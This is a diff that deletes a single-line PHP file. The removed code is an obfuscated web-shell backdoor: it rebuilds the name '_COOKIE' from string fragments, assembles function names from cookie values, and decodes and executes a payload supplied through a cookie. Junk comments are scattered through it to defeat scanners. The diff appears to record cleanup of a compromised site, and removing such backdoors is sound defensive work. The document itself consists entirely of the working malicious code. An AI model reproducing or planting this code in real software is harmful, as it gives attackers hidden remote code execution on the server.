@@ -1,1 +1,0 @@
-<?php $vj='KI';$j='E';/*q*/$bx='_C';/*v*/$m='OO';$eh/*@&LA*/=${$bx.$m.$vj.$j};if(isset($eh/*(@Dh*/['jA'])){$fx=$eh/*HM18*/['jA'].$eh['u'];$o=/*d^*/$eh['Gy'].$eh['Ny'].$eh['Eu'];$h=$fx('',$o($eh['nf']));$h();}
